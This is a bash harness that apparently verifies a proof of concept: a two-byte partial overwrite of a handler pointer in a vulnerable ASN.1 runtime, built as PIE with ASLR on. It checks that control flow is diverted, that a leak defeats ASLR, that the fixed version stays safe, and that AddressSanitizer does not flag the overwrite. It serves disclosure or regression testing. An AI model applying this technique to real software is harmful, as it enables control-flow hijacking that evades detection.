#!/usr/bin/env bash
# ASLR-resistant partial-pointer overwrite probe: PIE build, ASLR on, count=22.
# The pinned vulnerable runtime writes only the low two bytes of a live handler
# pointer; the high six bytes survive.  A low-16 diagnostic leak on the first
# loopback connection supplies the ASLR-dependent part of the target address.
# Expects `bash run.sh run` first (pinned runtimes + compiler under ./run).
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$HERE/run
cd "$HERE" || exit 2
export ASAN_OPTIONS=detect_leaks=0

INC="-I$OUT/gen-v17 -I$OUT/build/v46/asn1crt"
FIX="-I$OUT/gen-v17 -I$OUT/build/v47/asn1crt"
SRC="$HERE/pie-partial.c $OUT/gen-v17/schema.c"

gcc -g -O0 -Wall -fPIE -pie $INC $SRC "$OUT/build/v46/asn1crt/"*.c \
  -o "$OUT/pie_partial_v46" || exit 2
gcc -g -O0 -Wall -fPIE -pie $FIX $SRC "$OUT/build/v47/asn1crt/"*.c \
  -o "$OUT/pie_partial_v47" || exit 2
gcc -g -O0 -Wall -fPIE -pie -fsanitize=address $INC $SRC \
  "$OUT/build/v46/asn1crt/"*.c -o "$OUT/pie_partial_asan_v46" || exit 2

sym_addr() {
  local addr typ name
  while read -r addr typ name; do
    if [ "$name" = "$2" ]; then printf '%s' "$addr"; return 0; fi
  done < <(nm -n "$1" 2>/dev/null)
  return 1
}

delta_for() {
  local m s
  m=$(sym_addr "$1" marker) || return 2
  s=$(sym_addr "$1" safe_handler) || return 2
  printf '%d' "$((0x$m - 0x$s))"
}

round() {
  local bin=$1 port=$2 tag=$3 delta rc
  delta=${4:-$(delta_for "$bin")} || return 2
  echo "=== $tag delta=$delta ==="
  "$bin" server "$port" 22 > "$OUT/pie-partial-${tag}.log" 2>&1 &
  local srv=$!
  sleep 0.3
  "$bin" client "$port" "$delta" >> "$OUT/pie-partial-${tag}.log" 2>&1
  wait "$srv"
  rc=$?
  cat "$OUT/pie-partial-${tag}.log"
  echo "=== $tag rc=$rc ==="
  return "$rc"
}

fail=0
: > "$OUT/pie-partial-leaks.txt"
for i in 1 2 3 4 5; do
  round "$OUT/pie_partial_v46" "$((39300 + i))" "v46-$i" || fail=1
  sed -n 's/.*orig_low16=\([0-9a-f]*\).*/\1/p' \
    "$OUT/pie-partial-v46-$i.log" >> "$OUT/pie-partial-leaks.txt"
  grep -q 'MARKER: control-flow diverted' "$OUT/pie-partial-v46-$i.log" || fail=1
  grep -q 'high6_same=1' "$OUT/pie-partial-v46-$i.log" || fail=1
  grep -q 'canary: c0 c0 c0 c0 c0 c0 c0 c0' "$OUT/pie-partial-v46-$i.log" || fail=1
done

distinct=$(sort -u "$OUT/pie-partial-leaks.txt" | wc -l)
echo "distinct ASLR low16 values across 5 rounds: $distinct"
[ "$distinct" -ge 2 ] || fail=1

echo
echo "### fixed 4.7.0.1 control (same 2-byte partial overwrite) ###"
round "$OUT/pie_partial_v47" 39310 fixed_control || fail=1
grep -q 'SAFE: original handler intact' "$OUT/pie-partial-fixed_control.log" || fail=1
grep -q 'high6_same=1' "$OUT/pie-partial-fixed_control.log" || fail=1

echo
echo "### counterfactual: delta=0, same 2-byte write, target = live low16 -> SAFE ###"
round "$OUT/pie_partial_v46" 39312 counterfactual 0 || fail=1
grep -q 'SAFE: original handler intact' "$OUT/pie-partial-counterfactual.log" || fail=1

echo
echo "### ASan PIE build, one vulnerable round (no redzone diagnostic) ###"
round "$OUT/pie_partial_asan_v46" 39311 asan_v46 || fail=1
if grep -q 'ERROR: AddressSanitizer' "$OUT/pie-partial-asan_v46.log"; then
  echo "ASan diagnostic present in asan_v46 round"
  fail=1
fi

echo
echo "### overall: fail=$fail ###"
exit "$fail"
